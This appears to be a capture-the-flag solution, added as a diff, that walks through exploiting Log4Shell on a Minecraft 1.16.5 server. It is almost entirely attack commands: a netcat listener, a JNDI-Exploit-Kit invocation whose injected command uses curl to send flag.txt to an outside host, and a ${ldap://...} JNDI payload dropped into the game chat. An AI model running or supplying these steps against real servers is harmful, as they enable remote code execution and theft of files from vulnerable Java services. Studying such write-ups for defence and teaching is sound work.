@@ -1,0 +1,13 @@
+Start a netcat server:
+nc -l 8001
+
+Take the following command:
+curl --data-binary @flag.txt http://myserver:8001
+
+Use JNDI-Exploit-Kit (https://github.com/pimps/JNDI-Exploit-Kit) to start a server:
+java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "curl --data-binary @flag.txt http://fish.informatik.sexy:8001/"
+
+Then, take the JDK 1.8 payload and wrap it as a payload:
+${ldap://172.23.0.2:1389/hqtyqj}
+
+Connect to the Minecraft server using Minecraft 1.16.5 and drop the payload in the chat.
